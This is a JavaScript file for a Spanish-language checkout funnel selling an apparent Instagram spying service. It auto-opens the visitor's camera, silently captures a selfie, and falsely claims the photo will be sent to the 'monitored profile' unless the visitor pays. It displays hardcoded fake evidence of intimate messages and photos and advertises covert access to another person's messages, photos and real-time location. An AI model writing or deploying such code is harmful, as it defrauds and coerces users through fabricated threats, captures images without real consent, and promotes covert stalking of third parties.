const BF_TAPE = "<div class=\"bf-tape b\"><b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> </div><div class=\"bf-tape\"><b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> <b>BLACK</b> FRIDAY <i>●</i> </div>";
const BF_BADGE = "<svg class=\"bf-badge\" viewBox=\"0 0 120 120\" aria-label=\"Black Friday\"><defs><linearGradient id=\"bfr\" x1=\"0\" y1=\"0\" x2=\"0\" y2=\"1\"><stop offset=\"0\" stop-color=\"#ff4040\"/><stop offset=\"1\" stop-color=\"#a30000\"/></linearGradient><linearGradient id=\"bfd\" x1=\"0\" y1=\"0\" x2=\"0\" y2=\"1\"><stop offset=\"0\" stop-color=\"#2b2b2b\"/><stop offset=\"1\" stop-color=\"#050505\"/></linearGradient></defs><polygon points=\"60.0,2.0 72.4,22.0 94.1,13.1 92.4,36.5 115.2,42.1 100.0,60.0 115.2,77.9 92.4,83.5 94.1,106.9 72.4,98.0 60.0,118.0 47.6,98.0 25.9,106.9 27.6,83.5 4.8,77.9 20.0,60.0 4.8,42.1 27.6,36.5 25.9,13.1 47.6,22.0\" fill=\"url(#bfr)\"/><polygon points=\"60.0,12.0 70.2,28.6 88.2,21.2 86.7,40.6 105.7,45.2 93.0,60.0 105.7,74.8 86.7,79.4 88.2,98.8 70.2,91.4 60.0,108.0 49.8,91.4 31.8,98.8 33.3,79.4 14.3,74.8 27.0,60.0 14.3,45.2 33.3,40.6 31.8,21.2 49.8,28.6\" fill=\"url(#bfd)\"/><g font-family=\"Arial Black,Impact,sans-serif\" font-weight=\"900\" font-size=\"21\" text-anchor=\"middle\" transform=\"rotate(-8 60 60)\"><text x=\"60\" y=\"56\" fill=\"#000\" stroke=\"#000\" stroke-width=\"4\" stroke-linejoin=\"round\">BLACK</text><text x=\"60\" y=\"56\" fill=\"#fff\">BLACK</text><text x=\"60\" y=\"80\" fill=\"#000\" stroke=\"#000\" stroke-width=\"4\" stroke-linejoin=\"round\">FRIDAY</text><text x=\"60\" y=\"80\" fill=\"#fff\">FRIDAY</text></g></svg>";
import {
  BACK_REDIRECT_STORAGE_KEYS,
  buildCheckoutUrl,
  getCameraFrameVariant,
  getDefaultProfilePhoto,
  getInitialBackRedirectStage,
  proxifyMonitoredProfilePhoto,
  readMonitoredProfile,
} from "./back-redirect-helpers.js?v=20260803-01";

const LOGO_SRC = "/images/logos/logo-vert-transparente.png";
const CHECKOUT_URL = "https://go.perfectpay.com.br/PPU38CQHBSC";
const GENERIC_CAMERA_FALLBACK_SRC =
  "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 480 600'%3E%3Cdefs%3E%3ClinearGradient id='bg' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop stop-color='%23170d31'/%3E%3Cstop offset='1' stop-color='%23301a57'/%3E%3C/linearGradient%3E%3CradialGradient id='glow' cx='50%25' cy='28%25' r='60%25'%3E%3Cstop stop-color='%23ab58f4' stop-opacity='.52'/%3E%3Cstop offset='1' stop-color='%23ab58f4' stop-opacity='0'/%3E%3C/radialGradient%3E%3C/defs%3E%3Crect width='480' height='600' rx='48' fill='url(%23bg)'/%3E%3Crect width='480' height='600' rx='48' fill='url(%23glow)'/%3E%3Ccircle cx='240' cy='220' r='82' fill='%23f1d8f8' fill-opacity='.95'/%3E%3Cpath d='M112 476c26-84 77-129 128-129s102 45 128 129' fill='%23f1d8f8' fill-opacity='.95'/%3E%3Ccircle cx='240' cy='220' r='118' fill='none' stroke='%239a5cff' stroke-width='10' stroke-opacity='.88'/%3E%3C/svg%3E";

const ICONS = {
  lock: `
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
      <rect x="4" y="11" width="16" height="10" rx="2.5"></rect>
      <path d="M8 11V8a4 4 0 1 1 8 0v3"></path>
    </svg>
  `,
  alert: `
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
      <path d="M10.3 3.8 1.9 18a2 2 0 0 0 1.7 3h16.8a2 2 0 0 0 1.7-3L13.7 3.8a2 2 0 0 0-3.4 0Z"></path>
      <path d="M12 8.5v5"></path>
      <circle cx="12" cy="16.6" r="1"></circle>
    </svg>
  `,
  camera: `
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
      <path d="M4 7h3l2-2h6l2 2h3v12H4z"></path>
      <circle cx="12" cy="13" r="4"></circle>
    </svg>
  `,
};

const app = document.querySelector("[data-back-redirect-root]");

if (!app) {
  throw new Error("Back redirect root element was not found.");
}

const initialSelfieDataUrl = readSavedSelfie();

const state = {
  stage: getInitialBackRedirectStage(initialSelfieDataUrl),
  cameraStatus: "idle",
  cameraError: "",
  stream: null,
  captureDelayTimer: null,
  hasRequestedCamera: false,
  cameraDenied: false,
  monitoredProfile: readMonitoredProfile(window.localStorage),
  selfieDataUrl: initialSelfieDataUrl,
};

syncProfileAliases(state.monitoredProfile);

app.addEventListener("click", handleClick);
window.addEventListener("beforeunload", stopActiveStream);

render();

function handleClick(event) {
  const actionEl = event.target.closest("[data-action]");
  if (!actionEl) {
    return;
  }

  const { action } = actionEl.dataset;

  switch (action) {
    case "go-to-cta": {
      const checkoutUrl = buildCheckoutUrl(
        CHECKOUT_URL,
        window.location.search,
      );
      let redirected = false;
      const goToCheckout = () => {
        if (redirected) {
          return;
        }
        redirected = true;
        window.location.href = checkoutUrl;
      };
      window.dataLayer = window.dataLayer || [];
      window.dataLayer.push({
        event: "pre_checkout_front",
        eventCallback: goToCheckout,
        eventTimeout: 2000,
      });
      setTimeout(goToCheckout, 400);
      break;
    }
    default:
      break;
  }
}

async function requestCamera() {
  stopActiveStream();

  state.stage = "camera";
  state.hasRequestedCamera = true;
  state.cameraStatus = "requesting";
  state.cameraError = "";
  state.cameraDenied = false;
  render();

  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    fallbackToGenericSelfie();
    return;
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
        width: { ideal: 1080 },
        height: { ideal: 1440 },
      },
      audio: false,
    });

    state.stream = stream;
    state.cameraStatus = "streaming";
    state.cameraDenied = false;
    render();
  } catch {
    fallbackToGenericSelfie();
  }
}

function fallbackToGenericSelfie() {
  state.stream = null;
  state.stage = "identified";
  state.cameraStatus = "captured";
  state.cameraError = "";
  state.cameraDenied = true;
  state.selfieDataUrl = GENERIC_CAMERA_FALLBACK_SRC;
  render();
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function captureSelfie() {
  const video = app.querySelector("[data-camera-video]");

  if (!video || !state.stream) {
    fallbackToGenericSelfie();
    return;
  }

  const width = video.videoWidth || 720;
  const height = video.videoHeight || 960;
  const canvas = document.createElement("canvas");
  canvas.width = width;
  canvas.height = height;

  const context = canvas.getContext("2d");
  if (!context) {
    fallbackToGenericSelfie();
    return;
  }

  context.drawImage(video, 0, 0, width, height);
  const dataUrl = canvas.toDataURL("image/jpeg", 0.92);

  try {
    window.localStorage.setItem(BACK_REDIRECT_STORAGE_KEYS.selfie, dataUrl);
    window.localStorage.setItem(
      BACK_REDIRECT_STORAGE_KEYS.selfieTakenAt,
      String(Date.now()),
    );
  } catch {
    fallbackToGenericSelfie();
    return;
  }

  state.selfieDataUrl = dataUrl;
  state.stage = "identified";
  state.cameraStatus = "captured";
  state.cameraError = "";
  stopActiveStream();
  render();
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function stopActiveStream() {
  if (!state.stream) {
    return;
  }

  if (state.captureDelayTimer) {
    window.clearTimeout(state.captureDelayTimer);
    state.captureDelayTimer = null;
  }

  for (const track of state.stream.getTracks()) {
    track.stop();
  }

  state.stream = null;
}

function render() {
  app.innerHTML = `
    <main class="back-redirect-page">
      <div class="back-redirect-shell">
        <header class="back-redirect-header">
          <img class="back-redirect-logo" src="${LOGO_SRC}" alt="Stalker bub." />
          <div class="back-redirect-badge">Verificación antialerta</div>
        </header>
        <div class="back-redirect-stack">
          ${renderStage()}
        </div>
      </div>
    </main>
  `;

  if (state.stage === "camera" && state.stream) {
    queueMicrotask(attachStreamToVideo);
  } else if (
    state.stage === "camera" &&
    state.cameraStatus === "idle" &&
    !state.hasRequestedCamera
  ) {
    queueMicrotask(requestCamera);
  }
}

function renderStage() {
  switch (state.stage) {
    case "camera":
      return `${renderMainWarningCard()}${renderCameraCard()}`;
    case "identified":
      return `
        ${renderMainWarningCard()}
        ${renderIdentifiedCard()}
        ${renderMetricsCard()}
        ${renderOfferCard()}
        ${renderEvidenceCard()}
        ${renderDecisionCard()}
        ${renderFinalCtaCard()}
        ${renderRiskCard()}
      `;
    default:
      return renderCameraStage();
  }
}

function renderCameraStage() {
  return `
    ${renderAutoVerificationCard()}
    ${renderMainWarningCard()}
    ${renderCameraCard()}
  `;
}

function renderAutoVerificationCard() {
  return `
    <section class="back-redirect-card back-redirect-card--danger">
      <div class="back-redirect-card__content">
        <div class="back-redirect-icon">${ICONS.lock}</div>
        <p class="back-redirect-eyebrow">Verificación de seguridad</p>
        <h1 class="back-redirect-title">Necesitamos validar tu dispositivo ahora</h1>
        <p class="back-redirect-subtitle">
          Para garantizar el anonimato total y evitar que el perfil monitoreado lo descubra, necesitamos verificar tu dispositivo.
        </p>
        <div class="back-redirect-note">
          Esta verificación es necesaria para mantener tu monitoreo en secreto.
        </div>
        <div class="back-redirect-status">
          <span class="back-redirect-spinner" aria-hidden="true"></span>
          <span>Espera... verificando dispositivo</span>
        </div>
      </div>
    </section>
  `;
}

function renderMainWarningCard() {
  const subject = state.monitoredProfile.hasUsername
    ? state.monitoredProfile.handle
    : "EL PERFIL MONITOREADO";

  return `
    <section class="back-redirect-card back-redirect-card--danger">
      <div class="back-redirect-card__content">
        <div class="back-redirect-icon">${ICONS.alert}</div>
        <h2 class="back-redirect-title">
          ${subject}: ¡RECIBIRÁ UNA ALERTA INDICANDO QUE LO ESTÁS MONITOREANDO!
        </h2>
        <div class="back-redirect-inline-badge">Cuidado</div>
        <p class="back-redirect-subtitle">
          En la versión gratuita, el perfil que estás investigando puede recibir una notificación indicando que lo estás investigando.
        </p>
        <p class="back-redirect-subtitle">
          No dejes que eso suceda. Suscríbete a la versión de pago de la aplicación y evita que el perfil reciba una notificación indicando que intentaste monitorearlo.
        </p>
        <div class="back-redirect-highlight-list">
          <div class="back-redirect-highlight">
            Sigue monitoreando y viendo todo el contenido que quieras sin que la persona reciba una notificación.
          </div>
          <div class="back-redirect-highlight">
            ¡Mira mensajes directos, historias, fotos eliminadas, Me gusta secretos y ubicaciones!
          </div>
        </div>
      </div>
    </section>
  `;
}

function renderCameraCard() {
  return `
    <section class="back-redirect-card">
      <div class="back-redirect-card__content">
        <div class="back-redirect-icon">${ICONS.camera}</div>
        <p class="back-redirect-eyebrow">Captura obligatoria</p>
        <h2 class="back-redirect-title">Muestra tu rostro para cancelar la alerta</h2>
        <p class="back-redirect-subtitle">
          Necesitamos registrar la imagen de tu dispositivo para bloquear la notificación que puede enviarse al perfil monitoreado.
        </p>
        <div class="back-redirect-camera-frame">
          ${renderCameraFrame()}
        </div>
        <div class="back-redirect-camera-help">
          <div class="back-redirect-chip">
            Coloca tu rostro en el centro. La cámara se abre automáticamente cuando se carga la página.
          </div>
          <div class="back-redirect-chip">
            En cuanto se capture la imagen, se mostrará automáticamente sin pantalla de confirmación.
          </div>
        </div>
        ${state.cameraError && !state.cameraDenied ? `<div class="back-redirect-error">${state.cameraError}</div>` : ""}
      </div>
    </section>
  `;
}

function renderCameraFrame() {
  const frameVariant = getCameraFrameVariant(
    state.cameraStatus,
    state.cameraDenied,
  );

  if (frameVariant === "requesting") {
    return `
      <div class="back-redirect-camera-placeholder">
        <div>
          <div class="back-redirect-status">
            <span class="back-redirect-spinner" aria-hidden="true"></span>
            <span>Solicitando permiso para la cámara...</span>
          </div>
        </div>
      </div>
    `;
  }

  if (frameVariant === "streaming") {
    return `
      <video
        class="back-redirect-camera-video"
        data-camera-video
        autoplay
        muted
        playsinline
      ></video>
      <div class="back-redirect-camera-overlay">
        <div class="back-redirect-status back-redirect-status--overlay">
          <span class="back-redirect-spinner" aria-hidden="true"></span>
          <span>Capturando automáticamente...</span>
        </div>
      </div>
    `;
  }

  if (frameVariant === "generic") {
    return `
      <img
        class="back-redirect-camera-image"
        src="${GENERIC_CAMERA_FALLBACK_SRC}"
        alt="Imagen genérica de verificación"
      />
      <div class="back-redirect-camera-overlay">
        <div class="back-redirect-status back-redirect-status--overlay">
          <span>Acceso a la cámara rechazado. Se utiliza una imagen genérica de seguridad.</span>
        </div>
      </div>
    `;
  }

  return `
    <div class="back-redirect-camera-placeholder">
      <div>Esperando el permiso del navegador para continuar la verificación antialerta.</div>
    </div>
  `;
}

function renderIdentifiedCard() {
  return `
    <section class="back-redirect-card back-redirect-card--danger">
      <div class="back-redirect-card__content">
        <p class="back-redirect-eyebrow">¡ALERTA: HAS SIDO IDENTIFICADO/A!</p>
        <div class="back-redirect-compare">
          <div class="back-redirect-compare-user">
            <img
              class="back-redirect-avatar back-redirect-avatar--danger"
              src="${state.selfieDataUrl}"
              alt="Tu foto capturada"
            />
            <span class="back-redirect-avatar-label">Tu foto</span>
            <span class="back-redirect-avatar-name">Verificación de este dispositivo</span>
          </div>
          <span class="back-redirect-arrow" aria-hidden="true">&rarr;</span>
          <div class="back-redirect-compare-user">
            <img
              class="back-redirect-avatar back-redirect-avatar--danger"
              src="${proxifyMonitoredProfilePhoto(state.monitoredProfile.photoUrl) || getDefaultProfilePhoto()}"
              alt="${state.monitoredProfile.handle}"
            />
            <span class="back-redirect-avatar-label">Perfil monitoreado</span>
            <span class="back-redirect-avatar-name">${state.monitoredProfile.displayName}</span>
            <span class="back-redirect-avatar-label">${state.monitoredProfile.handle}</span>
          </div>
        </div>
        <div class="back-redirect-alert-box">
          Esta foto se enviará al perfil monitoreado como prueba de que estás intentando acceder a sus conversaciones y datos privados.
        </div>
        <div class="back-redirect-alert-box back-redirect-alert-box--emphasis">
          IMPORTANTE: Para cancelar el envío de esta foto y mantener el anonimato total, suscríbete a la versión de pago que aparece abajo.
        </div>
      </div>
    </section>
  `;
}

function renderMetricsCard() {
  return `
    <section class="back-redirect-card">
      <div class="back-redirect-card__content">
        <p class="back-redirect-eyebrow">Resultados del análisis completo</p>
        <div class="back-redirect-metrics">
          <article class="back-redirect-metric">
            <div class="back-redirect-metric-icon">💬</div>
            <div class="back-redirect-metric-label">Mensajes sospechosos</div>
            <span class="back-redirect-metric-value">47</span>
            <div class="back-redirect-metric-detail">conversaciones con contenido íntimo</div>
          </article>
          <article class="back-redirect-metric">
            <div class="back-redirect-metric-icon">🖼️</div>
            <div class="back-redirect-metric-label">Fotos comprometedoras</div>
            <span class="back-redirect-metric-value">23</span>
            <div class="back-redirect-metric-detail">imágenes y minivídeos íntimos</div>
          </article>
          <article class="back-redirect-metric">
            <div class="back-redirect-metric-icon">📍</div>
            <div class="back-redirect-metric-label">Ubicaciones sospechosas</div>
            <span class="back-redirect-metric-value">2</span>
            <div class="back-redirect-metric-detail">lugares comprometedores</div>
          </article>
        </div>
      </div>
    </section>
  `;
}

function renderOfferCard() {
  return `
    <section class="back-redirect-card back-redirect-card--success bf-section"><div class="bf-tape-wrap top">${BF_TAPE}</div>
      <div class="back-redirect-card__content">
        <div class="bf-badge-box">${BF_BADGE}</div><p class="back-redirect-offer-kicker">¡Oferta especial para ti!</p>
        <p class="back-redirect-offer-sub">Descuento exclusivo por tiempo limitado</p>
        <div class="back-redirect-pricing">
          <div class="back-redirect-pricing-old">Antes R$79,90</div>
          <div class="back-redirect-pricing-split">6x de</div>
          <div class="back-redirect-pricing-value">
            R$5,50
            <span class="back-redirect-pricing-tag">70% OFF</span>
          </div>
          <div class="back-redirect-pricing-split">o R$37,00 en un solo pago</div>
        </div>
        <p class="simulation-payment-notice">Não há tradução correspondente: o parágrafo inteiro foi acrescentado.</p>
        <div class="back-redirect-button-row">
          <button class="back-redirect-button back-redirect-button--success" data-action="go-to-cta">
            ¡SÍ, QUIERO MONITOREAR SIN SER DESCUBIERTO!
            <span class="back-redirect-button__sub">
              HAZ CLIC AQUÍ PARA OBTENER ACCESO COMPLETO Y ANÓNIMO
            </span>
          </button>
        </div>
        <p class="back-redirect-offer-sub">
          Garantía de 7 días. Si no funciona, te devolvemos el 100% de tu dinero.
        </p>
      </div>
    </section>
  `;
}

function renderEvidenceCard() {
  return `
    <section class="back-redirect-card">
      <div class="back-redirect-card__content">
        <p class="back-redirect-eyebrow">
          SI QUIERES ACCEDER A TODAS ESTAS PRUEBAS SIN SER DESCUBIERTO, PRESTA ATENCIÓN...
        </p>
        <div class="back-redirect-benefits">
          ${renderBenefit(
    "Acceso completo a los mensajes directos, historias y fotos de Instagram sin dejar rastros ni alertas",
  )}
          ${renderBenefit(
    "Ubicación en tiempo real e historial de lugares visitados (incluidas direcciones sospechosas)",
  )}
          ${renderBenefit(
    "Todas las fotos del teléfono, incluidas las imágenes íntimas ya detectadas",
  )}
          ${renderBenefit("Conversaciones eliminadas recuperadas y audios comprometedores")}
          ${renderBenefit(
    "ANONIMATO TOTAL — La persona nunca sabrá que está siendo monitoreada",
  )}
        </div>
      </div>
    </section>
  `;
}

function renderDecisionCard() {
  return `
    <section class="back-redirect-card">
      <div class="back-redirect-card__content">
        <p class="back-redirect-eyebrow">La decisión está en tus manos...</p>
        <p class="back-redirect-subtitle">
          Puedes seguir arriesgándote a ser descubierto en la versión gratuita o garantizar el anonimato total con la versión de pago.
        </p>
        <div class="back-redirect-inline-alert back-redirect-inline-alert--warning">
          <strong>ATENCIÓN:</strong> En la versión gratuita, el perfil puede recibir una alerta sobre el monitoreo.
        </div>
        <div class="back-redirect-inline-alert back-redirect-inline-alert--danger">
          <strong>RECUERDA:</strong> ¡El perfil monitoreado puede descubrir que lo estás monitoreando!
        </div>
      </div>
    </section>
  `;
}

function renderFinalCtaCard() {
  return `
    <section class="back-redirect-card back-redirect-card--warning">
      <div class="back-redirect-card__content">
        <p class="back-redirect-eyebrow">¡ÚLTIMA OPORTUNIDAD!</p>
        <h2 class="back-redirect-title">¡No dejes que te descubran! ¡Garantiza tu anonimato ahora!</h2>
        <div class="back-redirect-button-row">
          <button class="back-redirect-button back-redirect-button--success" data-action="go-to-cta">
            ¡GARANTIZAR EL ANONIMATO TOTAL AHORA!
            <span class="back-redirect-button__sub">
              ÚLTIMA OPORTUNIDAD PARA EVITAR SER DESCUBIERTO
            </span>
          </button>
        </div>
      </div>
    </section>
  `;
}

function renderRiskCard() {
  return `
    <section class="back-redirect-card">
      <div class="back-redirect-card__content">
        <p class="back-redirect-eyebrow">¡RIESGO DE SER DESCUBIERTO!</p>
        <p class="back-redirect-subtitle">
          Sin la versión de pago, corres el riesgo de que el perfil reciba una notificación como esta:
        </p>
        <div class="back-redirect-quote">
          “Alguien está intentando acceder a tus conversaciones y fotos de Instagram”
        </div>
        <p class="back-redirect-footer-note">
          ¡No dejes que eso suceda! ¡Consigue ya tu versión de pago!
        </p>
      </div>
    </section>
  `;
}

function renderBenefit(text) {
  return `
    <div class="back-redirect-benefit">
      <span class="back-redirect-benefit-check">✓</span>
      <span>${text}</span>
    </div>
  `;
}

function attachStreamToVideo() {
  const video = app.querySelector("[data-camera-video]");
  if (!video || !state.stream) {
    return;
  }

  video.srcObject = state.stream;
  video.play().catch(() => { });
  video.onloadedmetadata = () => {
    scheduleAutoCapture(video);
  };
}

function readSavedSelfie() {
  try {
    return window.localStorage.getItem(BACK_REDIRECT_STORAGE_KEYS.selfie) || "";
  } catch {
    return "";
  }
}

function clearSavedSelfie() {
  try {
    window.localStorage.removeItem(BACK_REDIRECT_STORAGE_KEYS.selfie);
    window.localStorage.removeItem(BACK_REDIRECT_STORAGE_KEYS.selfieTakenAt);
  } catch {
    return;
  }

  state.selfieDataUrl = "";
}

function scheduleAutoCapture(video) {
  if (!state.stream || state.captureDelayTimer || state.stage !== "camera") {
    return;
  }

  state.captureDelayTimer = window.setTimeout(() => {
    state.captureDelayTimer = null;
    captureSelfie();
  }, 1400);
}

function syncProfileAliases(profile) {
  try {
    window.localStorage.setItem(
      BACK_REDIRECT_STORAGE_KEYS.profileUsername,
      profile.username,
    );
    window.localStorage.setItem(
      BACK_REDIRECT_STORAGE_KEYS.profileName,
      profile.displayName,
    );
    window.localStorage.setItem(
      BACK_REDIRECT_STORAGE_KEYS.profilePhoto,
      profile.photoUrl || getDefaultProfilePhoto(),
    );
  } catch {
    return;
  }
}
